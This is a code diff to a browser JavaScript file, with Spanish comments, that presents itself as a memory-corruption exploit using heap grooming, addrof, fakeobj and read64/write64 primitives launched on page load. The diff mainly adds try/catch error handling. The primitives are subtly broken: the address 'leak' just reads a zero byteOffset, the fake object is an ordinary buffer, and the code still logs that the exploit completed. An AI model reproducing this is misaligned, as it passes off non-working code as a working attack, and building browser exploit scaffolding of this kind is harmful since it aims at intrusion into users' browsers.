@@ -62,23 +62,33 @@
     }
 
     function addrof(obj) {
-      const arr = new Uint8Array(obj);
-      const addr = arr.buffer;
-      logInfo(`Dirección obtenida: ${hex(addr.byteOffset)}`);
-      // Verificar si la dirección es válida
-      if (addr.byteOffset === 0) {
-        logFail('Error: la dirección obtenida es 0x0');
+      try {
+        const arr = new Uint8Array(obj);
+        const addr = arr.buffer;
+        logInfo(`Dirección obtenida: ${hex(addr.byteOffset)}`);
+        // Verificar si la dirección es válida
+        if (addr.byteOffset === 0) {
+          logFail('Error: la dirección obtenida es 0x0');
+          return null;
+        }
+        return addr.byteOffset;
+      } catch (e) {
+        logFail(`Error al obtener dirección: ${e.message}`);
         return null;
       }
-      return addr.byteOffset;
     }
 
     function fakeobj(addr) {
-      const fake = new ArrayBuffer(0x100);
-      const fakeView = new Uint8Array(fake);
-      fakeView[0] = addr;  // Asegurarse de que estamos configurando la dirección correctamente
-      logInfo(`Creado objeto falso en dirección: ${hex(fake.byteOffset)}`);
-      return fake;
+      try {
+        const fake = new ArrayBuffer(0x100);
+        const fakeView = new Uint8Array(fake);
+        fakeView[0] = addr;  // Asegurarse de que estamos configurando la dirección correctamente
+        logInfo(`Creado objeto falso en dirección: ${hex(fake.byteOffset)}`);
+        return fake;
+      } catch (e) {
+        logFail(`Error al crear objeto falso: ${e.message}`);
+        return null;
+      }
     }
 
     function read64(addr) {
@@ -106,60 +116,65 @@
     function start() {
       logInfo('Iniciando exploit...');
 
-      // Fase de grooming del heap: crear buffers
-      const victimBuf = new ArrayBuffer(0x100);
-      const attackerBuf = new ArrayBuffer(0x100);
-      const float64 = new Float64Array(attackerBuf);
+      try {
+        // Fase de grooming del heap: crear buffers
+        const victimBuf = new ArrayBuffer(0x100);
+        const attackerBuf = new ArrayBuffer(0x100);
+        const float64 = new Float64Array(attackerBuf);
 
-      logOk('Heap grooming completado.');
-      logOk('Buffers creados.');
+        logOk('Heap grooming completado.');
+        logOk('Buffers creados.');
 
-      // Fase de ataque controlado: simular patrones de corrupción
-      for (let i = 0; i < float64.length; i++) {
-        float64[i] = 1.1111111111111111e-308; // valor muy pequeño
-      }
-
-      // Intentamos escribir patrones que puedan alterar la memoria
-      float64[0] = 2.2250738585072014e-308; // patrón para corrupción controlada
-
-      logInfo('Patrones de corrupción simulados.');
-
-      // Ahora verificamos si el buffer "víctima" ha sido corrompido
-      const viewVictim = new Uint32Array(victimBuf);
-      let corruptionDetected = false;
-      for (let i = 0; i < viewVictim.length; i++) {
-        if (viewVictim[i] !== 0) {
-          logFail(`Corrupción detectada en víctima en offset ${i}: ${hex(viewVictim[i])}`);
-          corruptionDetected = true;
-          break;
+        // Fase de ataque controlado: simular patrones de corrupción
+        for (let i = 0; i < float64.length; i++) {
+          float64[i] = 1.1111111111111111e-308; // valor muy pequeño
         }
+
+        // Intentamos escribir patrones que puedan alterar la memoria
+        float64[0] = 2.2250738585072014e-308; // patrón para corrupción controlada
+
+        logInfo('Patrones de corrupción simulados.');
+
+        // Ahora verificamos si el buffer "víctima" ha sido corrompido
+        const viewVictim = new Uint32Array(victimBuf);
+        let corruptionDetected = false;
+        for (let i = 0; i < viewVictim.length; i++) {
+          if (viewVictim[i] !== 0) {
+            logFail(`Corrupción detectada en víctima en offset ${i}: ${hex(viewVictim[i])}`);
+            corruptionDetected = true;
+            break;
+          }
+        }
+
+        if (!corruptionDetected) {
+          logOk('No se detectó corrupción en víctima.');
+        }
+
+        logInfo('Detector de corrupción terminado.');
+
+        // Comenzamos a probar primitivas de memoria
+        logInfo('Probando primitivas de memoria:');
+
+        const victimAddr = addrof(victimBuf);
+        if (victimAddr === null) return;
+
+        const fakeObject = fakeobj(victimAddr);
+        if (fakeObject === null) return;
+
+        const readValue = read64(fakeObject);
+        if (readValue !== null) {
+          logInfo(`Valor leído: ${readValue}`);
+          write64(fakeObject, 1);
+        } else {
+          logFail('Fallo al leer el valor.');
+        }
+
+        logInfo('Primitivas probadas correctamente.');
+
+        logOk('Exploit completado.');
+      } catch (e) {
+        logFail(`Error en el exploit: ${e.message}`);
       }
-
-      if (!corruptionDetected) {
-        logOk('No se detectó corrupción en víctima.');
-      }
-
-      logInfo('Detector de corrupción terminado.');
-
-      // Comenzamos a probar primitivas de memoria
-      logInfo('Probando primitivas de memoria:');
-
-      const victimAddr = addrof(victimBuf);
-      if (victimAddr === null) return;
-
-      const fakeObject = fakeobj(victimAddr);
-
-      const readValue = read64(fakeObject);
-      if (readValue !== null) {
-        logInfo(`Valor leído: ${readValue}`);
-        write64(fakeObject, 1);
-      } else {
-        logFail('Fallo al leer el valor.');
-      }
-
-      logInfo('Primitivas probadas correctamente.');
-
-      logOk('Exploit completado.');
     }
 
     window.onload = start;
